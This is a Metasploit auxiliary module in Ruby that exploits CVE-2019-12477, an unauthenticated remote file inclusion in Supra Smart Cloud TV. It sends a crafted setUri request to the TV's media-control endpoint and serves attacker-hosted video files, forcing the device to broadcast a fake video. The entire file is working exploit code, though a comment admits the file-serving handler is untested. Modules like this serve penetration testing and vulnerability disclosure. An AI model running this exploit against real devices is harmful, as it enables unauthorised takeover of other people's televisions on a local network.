##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Supra Smart Cloud TV Remote File Inclusion',
      'Description'    => %q{
        This module exploits an unauthenticated remote file inclusion which
        exists in Supra Smart Cloud TV. The media control for the device doesn't
        have any session management or authentication. Leveraging this, an
        attacker on the local network can send a crafted request to broadcast a
        fake video.
      },
      'Author'         => [
        'Dhiraj Mishra' # Discovery, PoC, and module
      ],
      'References'     => [
        ['CVE', '2019-12477'],
        ['URL', 'https://www.inputzero.io/2019/06/hacking-smart-tv.html']
      ],
      'DisclosureDate' => '2019-06-03',
      'License'        => MSF_LICENSE
    ))

    deregister_options('URIPATH')
  end

  def run
    start_service('Path' => '/')

    print_status("Sending fake broadcast to #{peer}")
    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => '/remote/media_control',
      'vars_get' => {
        'action' => 'setUri',
        'uri'    => get_uri + 'epicsax.m3u8'
      },
      'encode_params' => false
    )

    unless res && res.code == 200
      print_error('No fake video was broadcasted')
      return
    end

    print_good('Fake video was broadcasted')
  end

  # XXX: Untested! Please remove this comment if it works, RootUp
  def on_request_uri(cli, request)
    dir = File.join(Msf::Config.data_directory, 'exploits', 'CVE-2019-12477')

    files = {
      '/epicsax.m3u8' => 'application/x-mpegURL',
      '/epicsax0.ts'  => 'video/MP2T',
      '/epicsax1.ts'  => 'video/MP2T',
      '/epicsax2.ts'  => 'video/MP2T',
      '/epicsax3.ts'  => 'video/MP2T',
      '/epicsax4.ts'  => 'video/MP2T'
    }

    file = request.uri

    unless files.include?(file)
      vprint_error("Sending 404 for #{file}")
      return send_not_found(cli)
    end

    data = File.read(File.join(dir, file))

    vprint_good("Sending #{file}")
    send_response(cli, data, 'Content-Type' => files[file])
  end
end
